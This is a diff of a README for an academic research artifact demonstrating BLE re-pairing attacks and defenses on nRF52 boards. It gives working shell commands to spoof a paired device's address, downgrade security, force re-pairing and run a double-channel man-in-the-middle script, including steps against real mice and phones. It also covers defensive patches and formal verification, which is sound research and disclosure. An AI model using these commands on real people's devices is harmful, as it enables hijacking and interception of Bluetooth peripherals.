@@ -1,8 +1,8 @@
 # BLE Re-Pairing Attacks PoC
 
-This repository contains the attacks PoCs as described in the paper [BLERP: BLE Re-Pairing Attacks and Defenses](TODO) published at NDSS 26'.
+This repository contains the attacks PoCs as described in the paper [BLERP: BLE Re-Pairing Attacks and Defenses](TODO) accepted at NDSS 26'.
 
-The artifact is also available at [doi.org/10.5281/zenodo.17671927](https://doi.org/10.5281/zenodo.17671927)
+The artifact will also be available at [doi.org/10.5281/zenodo.17671927](https://doi.org/10.5281/zenodo.17671927)
 
 ## Requirements
 
@@ -12,9 +12,11 @@ The artifact is also available at [doi.org/10.5281/zenodo.17671927](https://doi.
 
 **Software:**
 
-  * [Segger JLink](https://www.segger.com/downloads/jlink/)
-  * [Apache newt v1.9.0](https://mynewt.apache.org/latest/newt/install/newt_linux.html)
-  * Python 3.12.0 (MitM attack only)
+  * Ubuntu 22.04+ or Fedora 40+
+  * [Arm GNU Toolchain 13.3.1](https://developer.arm.com/downloads/-/arm-gnu-toolchain-downloads/13-3-rel1)
+  * [Segger JLink V7.98h+](https://www.segger.com/downloads/jlink/)
+  * [Apache newt v1.13.0](https://mynewt.apache.org)
+  * Python 3.12+ (MitM attack only)
   * A serial device tool (e.g., [tio](https://github.com/tio/tio))
 
 ## Toolkit Setup
@@ -22,20 +24,20 @@ The artifact is also available at [doi.org/10.5281/zenodo.17671927](https://doi.
 1. Setup the workspace and patch the NimBLE stack
 
 ```bash
-git clone github.com/sacca97/blerp.git
+git clone https://github.com/sacca97/blerp
 cd blerp
 ./setup.sh
 cd blerp_poc
 ./apply_attacks_patches.sh
 ```
 
-2. Connect the board via USB and install the OS and _bleshell_ app (`ceid` is the actual S/N of the board)
+2. Run the following commands once per board to install the OS and bleshell app. The `id` parameter is the board's 10-digit serial number, which is physically printed on the board, but can also be shown using `tio -l | grep SEGGER`.
 
 ```bash
-make boot-10056 devid=0123456789 && make central ceid=0123456789
+make boot-10056 id=0123456789 && make bleshell id=0123456789
 ```
 
-3. Connect to the board using the serial tool, in our case
+3. Connect via serial and press _Tab_ to show the available commands and verify the installation was succesfull.
 
 ```bash
 tio /dev/serial/by-id/usb-SEGGER_J-Link_000123456789-if00
@@ -44,123 +46,145 @@ tio /dev/serial/by-id/usb-SEGGER_J-Link_000123456789-if00
 Once connected, pressing Tab will show the list of available commands.
 
 
-## Testing Peripheral Impersonation
+## Testing In a Controlled Environment
 
-This attack maps to Section IV.B of the paper. The user must pair the target Peripheral with a Central device (e.g., a mouse with a laptop or smartphone). Here we assume a mouse with a random BLE address.
+Test the impersonation attacks on the NimBLE stack using only two nRF52 boards. The firmware resets on power loss (erasing the keys), enabling one board to act first as a legitimate device and then as the attacker.
 
-The mouse must be paired with the Android device and turned off (or out of range) during the test.
+### Initial Setup
 
-1. Configure the board to spoof the Peripheral, send a fake _authreq_ value, have the lowest security settings, and reject one encrption request
-
+Configure and pair the two boards interacting with the via the shell. On the Peripheral run:
 ```sh
-# Address type can be random or public
-spoof-address addr=MAC_Address addr_type=random
-
-# Appearance=962 refers specifically to mice
-spoof-advertise-data name="MX Master 3" appearance=962
-
-# Request maximum security
-spoof-authreq mitm=1 bond=1 sc=1 keypress=1
-
-# Actually support lowest security
-security-set-data mitm=0 sc=0 keysize=7
-
-# Reject one encryption request only
-blerp-reject-enc val=1
-```
-
-2. Start advertising and wait for the victim Central to connect. Once it happens, the attack starts automatically.
-
-```bash
-# Must be the same address type of spoof-address
+spoof-address addr=F8:4C:6D:E9:7A:B1 addr_type=random
+spoof-adv-data name="MyMouse" appearance=962
 advertise own_addr_type=random
 ```
-
-If the victim disconnect after the encryption request rejection, the device is not vulnerable.
-
-## Testing Central Impersonation
-
-This attack maps to Section IV.C of the paper. The user is required to pair the target Peripheral with a Central device, as in the Peripheral Impersonation, with the only difference that, in this case, the Central must be turned off (or brought out of range).
-
-Devices are configured as in the Peripheral Impersonation attack. The attack starts when a connection is initiated
-
+On the Central run:
 ```sh
-# Centrals usually have public addresses
-spoof-address addr=MAC_Address addr_type=public
+spoof-address addr=00:1A:79:FF:EE:DD addr_type=public
+connect peer_addr=F8:4C:6D:E9:7A:B1 peer_addr_type=random own_addr_type=public
+```
+Ensure the logs show:
+```sh
+encryption change event; status=0
+encrypted=1, authenticated=0, bonded=1
+```
 
-# Actually support lowest security
+### Peripheral Impersonation
+
+
+The Peripheral board will now act as the attacker. Power cycle the Peripheral to clear its keys (simulating the attacker taking its place), then configure it for the attack:
+```bash
+# Set again the victim's address
+spoof-address addr=F8:4C:6D:E9:7A:B1 addr_type=random
+
+# Downgrade security parameters
+spoof-authreq mitm=1 bond=1 sc=1
 security-set-data mitm=0 sc=0 keysize=7
+blerp-reject-enc val=1
 
-# Peripherals usually have random addresses
-connect addr=MAC_Address addr_type=random
+# Begin malicious advertising
+advertise own_addr_type=random
+```
+On the Central device run the `connect` command again. The logs should show a connection with a partially zeroed-out Long Term Key (LTK) and status=0, indicating successful re-pairing.
+```sh
+LTK: 00000000000000000094d39485d06811
+pairing complete; status=0
+encryption change event; status=0
+encrypted=1, authenticated=0, bonded=1
 ```
 
-## Double-channel MitM
+### Central Impersonation
 
-This attack maps to the double-channel MitM attack described in Section IV.D of the paper. Similar to the previous attacks, the two victim devices must be paired. Once this is done, connect the two nRF52s to your machine and:
+If proceeding immediately after the Peripheral Impersonation attack, you must reset both boards and repeat the initial setup phase before starting. The board that was previously the Central will now act as the attacker. Power cycle the Central, then enter the following commands to configure it for the attack:
+```sh
+# Spoof the Legitimate Central's Address
+spoof-address addr=00:1A:79:FF:EE:DD addr_type=public
 
-1. Connect the two board to your machine and perform a clean install
+# Downgrade Security Parameters
+spoof-authreq mitm=1 bond=1 sc=1
+security-set-data mitm=0 sc=0 keysize=7 blerp-reject-enc val=1
+```
+Connect the attacker board to the victim Peripheral.
+```sh
+connect peer_addr=F8:4C:6D:E9:7A:B1 peer_addr_type=random own_addr_type=public
+```
+If successful, the logs should be similar to the previous one, with a partially zeroed-out LTK and no errors (i.e., status=0).
 
+## Real-World Device Testing
+
+The commands are identical to the previous sections, but the parameters are device-specific.
+
+### Peripheral Impersonation
+
+1. Pair a Peripheral (e.g., a BLE mouse) with the victim Central. Once paired, turn off the Peripheral or move it out of range.
+2. Configure the board to spoof the legitimate Peripheral. The address can be recovered from the Central's list of paired devices. The address type and device appearance must also match the actual one (e.g., 962 for mice, 961 for keyboards, or [others](https://www.bluetooth.com/specifications/assigned-numbers/)).
+
+3. The commands are the same as those used for controlled environment testing, although the parameters are different, so we will not repeat them. The attack will start as soon as the _advertise_ command is issued, as the victim Central will attempt to auto-reconnect to the Peripheral.
+
+The attack is successful if the Peripheral logs report completed events with status=0, indicating success. The legitimate Peripheral should no longer work with the Central even when turned back on.
 ```bash
-# Run twice, once per board
-make erase devid=0123456789 && make boot-10056 devid=0123456789
-
-# Run once, specify the boards S/N
-make hci-mitm ceid=0123456789 peid=9876543210
+pairing complete; status=0
+encryption change event; status=0
+encrypted=1, authenticated=0, bonded=1
 ```
 
-2.  Modify `python-host/mitm.py` and replace the variables in the main block with the ones of the victim devices
+### Central Impersonation
 
-```python
-CENTRAL_ADDR = "XX:XX:XX:XX:XX:XX"
+1. Pair the target Peripheral with the legitimate Central, then turn off the legitimate Central (e.g., disable Bluetooth from settings).
+2. Configure the board to spoof the Central using the same commands as before. Note that Centrals typically use a public address.
+3. Issue the _connect_ command with the correct parameters. This will connect and start the attack.
 
-CENTRAL_ADDR_TYPE = 0 # 0 for public, 1 for random
+If successful, the log will show the same message as the Peripheral attack. The legitimate Central, once turned back on, will no longer be able to control the Peripheral.
 
-PERIPHERAL_NAME = "Peripheral Name"
+## Double-Channel MitM
+
+The attack requires two nRF52 boards connected to a computer acting as a single attacker to intercept and redirect traffic between two paired victim devices (e.g., a real phone and a real mouse).
+
+1. Flash the specific MitM firmware onto both nRF52 boards. A clean install is recommended if coming from the previous tests. For each board, run the following command, replacing `id` with the board's serial number.
+```sh
+make erase id=0123456789
+make boot-10056 id=0123456789
+make hci-dev id=0123456789
+```
+2. Run the Python script with root privileges. You must provide the victim's Central address and the victim's Peripheral name.
+```sh
+sudo .venv/bin/python python-host/mitm.py --central-addr XX:XX:XX:XX:XX:XX --central-addr-type public --peripheral-name "Peripheral Name"
 ```
 
-3. Launch the MitM script (requires root)
+Now, disconnect the two legitimate devices by turning the Central's Bluetooth off. Once this is done, the script will:
 
-```bash
-sudo .venv/bin/python python-host/mitm.py
-```
+1. Capture and clone the advertisement data from the Peripheral, then wait for user input to start the attack. 
+2. The malicious Central will connect to the legitimate Peripheral, and the malicious Peripheral will begin advertising.
+3. Once the logs say "Peripheral: Advertising Started", manually turn the legitimate Central's Bluetooth back on. 
+4. The legitimate Central will reconnect to the malicious Peripheral, and the actual attack will start. 
+5. The legitimate Central may be prompted with a Yes/No dialog to confirm.
 
-Now disconnect the two legitimate devices by turning off Bluetooth on the Central. Once this is done, the attack will proceed as follows:
-
-1.  The malicious Peripheral copies the advertisement data from the legitimate Peripheral.
-2.  The malicious Central connects to the legitimate Peripheral, blocking its advertising.
-3.  The malicious Peripheral begins advertising using the spoofed data.
-4.  Manually turn the legitimate Central's Bluetooth on. 👤
-5.  The legitimate Central connects to the malicious Peripheral, starting the attack. The legitimate Central may be prompted with a Yes/No dialog box to confirm the connection.
+If the attack is successful, the two devices should appear to work as if nothing happened, but with a visible lag (e.g., if using a mouse or keyboard). The reported battery percentage of the Peripheral should be 69\%.
 
 ## Testing Hardened Re-pairing
 
-To test the hardened re-pairing, install the patched firmware on one of the nRF52 and use the other one as the attacker. 
-
-
+Apply the patch, re-flash the firmware on one of the nRF52, and repeat the attacks above.
 ```bash
 ./apply_fixes_patch.sh
-make erase devid=0123456789
-make central ceid=0123456789
+make erase id=0123456789
+make central id=0123456789
 ``` 
+Expected outputs: disconnection and re-pairing failure for both attacks.
 
-The tests follow the same steps outlined previously for the attacks, including the securtiy level downgrade.
+## Verifying Authenticated Re-pairing
 
-
-## Testing Authenticated Re-pairing
-
-The authenticated re-pairing protocol can be verified using ProVerif. For download and installation please refer to the [official website](https://bblanche.gitlabpages.inria.fr/proverif/). Once installed, run:
+Verify with ProVerif. For download and installation please refer to the [official website](https://proverif.inria.fr). Once installed, run:
 
 ```sh
 proverif formal/blerp_fixes.pv
 ```
 
-The model contains two queries, one to verify integrity and authentication of the re-pairing and another one to perform a sanity check to show that the protocol ends correctly. The ProVerif verification summary should reflect the one below:
+The model assumes a Dolev-Yao attacker with complete network control. It verifies that an attacker cannot complete re-pairing without knowledge of the original pairing key (authentication) and cannot tamper with the pairing messages (integrity). These two properties are formalized in a single query, which should evaluate to _true_. Additionally, we run a sanity check query that should evaluate to _false_, confirming that the protocol terminates correctly. The expected ProVerif output is the following:
 
-```sh
-# Injective correspondence
+```c
+(* Integrity and Authentication *)
 Query inj-event(end_B(k)) ==> inj-event(end_A(k)) is true.
 
-# Sanity check
+(* Sanity check *)
 Query not (event(end_A(k)) && event(end_B(k))) is false.
 ```
